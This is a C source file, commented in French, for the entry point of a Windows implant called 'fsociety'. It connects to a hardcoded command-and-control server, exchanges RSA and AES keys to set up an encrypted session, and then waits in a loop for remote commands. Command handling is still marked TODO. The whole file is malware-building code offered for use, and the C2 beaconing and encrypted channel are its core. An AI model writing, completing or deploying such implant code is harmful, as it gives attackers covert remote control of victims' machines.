#include "comm.h"
#include "crypto.h"
#include "rsa_der.h"
#include "protocol.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

/* ============================================================
 * fsociety — Point d'entrée de l'implant
 * ============================================================ */

/* État de session. */
typedef struct {
    uint8_t aes_key[FSO_KEY_SIZE];
    int     established;
} fso_session_t;

static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
{
    /* Convertit la clé publique en DER. */
    uint8_t der[1024];
    size_t der_len = sizeof(der);

    if (fso_rsa_bcrypt_to_der(kp->pub, kp->pub_len, der, &der_len)
        != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Conversion DER échouée\n");
        return -1;
    }

    printf("[*] Clé publique DER : %zu octets\n", der_len);

    /* Pack MSG_KEYX. */
    uint8_t packet[1200];
    int packet_len = fso_pack(MSG_KEYX, 0, der, (uint32_t)der_len,
                              packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "[-] fso_pack échoué\n");
        return -1;
    }

    /* Envoi. */
    if (fso_conn_send(conn, packet, (size_t)packet_len) < 0) {
        fprintf(stderr, "[-] Envoi MSG_KEYX échoué\n");
        return -1;
    }

    printf("[+] MSG_KEYX envoyé (%d octets)\n", packet_len);
    return 0;
}

static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
                     fso_session_t *sess)
{
    uint8_t buf[2048];
    int n = fso_conn_recv(conn, buf, sizeof(buf));
    if (n <= 0) {
        fprintf(stderr, "[-] Réception MSG_AUTH échouée\n");
        return -1;
    }

    /* Unpack. */
    fso_header_t header;
    const uint8_t *payload;
    if (fso_unpack(buf, (size_t)n, &header, &payload) != 0) {
        fprintf(stderr, "[-] fso_unpack échoué\n");
        return -1;
    }

    if (header.type != MSG_AUTH) {
        fprintf(stderr, "[-] Type inattendu : 0x%02X\n", header.type);
        return -1;
    }

    printf("[*] MSG_AUTH reçu (%u octets)\n", header.length);

    /* Déchiffre la clé AES avec la clé privée RSA. */
    size_t aes_len = sizeof(sess->aes_key);
    if (fso_rsa_decrypt(kp->priv, kp->priv_len,
                        payload, header.length,
                        sess->aes_key, &aes_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Déchiffrement RSA échoué\n");
        return -1;
    }

    if (aes_len != FSO_KEY_SIZE) {
        fprintf(stderr, "[-] Taille clé AES invalide : %zu\n", aes_len);
        return -1;
    }

    sess->established = 1;
    printf("[+] Session établie (clé AES de %zu octets)\n", aes_len);
    return 0;
}

int main(int argc, char **argv)
{
    const char *host = "10.188.152.166";
    uint16_t port = 8443;

    printf("========================================\n");
    printf("  fsociety — Implant\n");
    printf("========================================\n\n");

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (uint16_t)atoi(argv[2]);

    /* Init crypto. */
    if (fso_crypto_init() != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Init crypto échouée\n");
        return 1;
    }

    /* Génération de la paire RSA. */
    printf("[*] Génération de la paire RSA...\n");
    fso_rsa_keypair_t kp;
    if (fso_rsa_generate(&kp) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Génération RSA échouée\n");
        return 1;
    }
    printf("[+] Paire RSA générée\n");

    /* Init Winsock. */
    if (fso_conn_init() != 0) {
        fso_rsa_free(&kp);
        return 1;
    }

    /* Connexion au C2. */
    fso_conn_t conn;
    if (fso_conn_connect(&conn, host, port) != 0) {
        fprintf(stderr, "[-] Échec connexion au C2\n");
        fso_conn_cleanup();
        fso_rsa_free(&kp);
        return 1;
    }

    /* Échange de clé. */
    fso_session_t sess;
    memset(&sess, 0, sizeof(sess));

    if (send_keyx(&conn, &kp) != 0) {
        fprintf(stderr, "[-] Échange de clé échoué\n");
        goto cleanup;
    }

    if (recv_auth(&conn, &kp, &sess) != 0) {
        fprintf(stderr, "[-] Session non établie\n");
        goto cleanup;
    }

    printf("\n[+] Session sécurisée active\n\n");

    /* Boucle infinie : en attente de commandes. */
    printf("[*] En attente de commandes du C2...\n");

    char buf[FSO_CONN_RECV_BUF];
    while (conn.connected) {
        int n = fso_conn_recv(&conn, buf, sizeof(buf));

        if (n == 0) {
            printf("[-] C2 a fermé la connexion\n");
            break;
        }
        if (n < 0) {
            printf("[-] Erreur de réception\n");
            break;
        }

        printf("[*] %d octets reçus du C2\n", n);
        /* TODO: déchiffrer et traiter la commande. */
    }

cleanup:
    printf("[*] Déconnexion\n");
    fso_conn_close(&conn);
    fso_conn_cleanup();
    fso_rsa_free(&kp);
    fso_crypto_cleanup();

    return 0;
}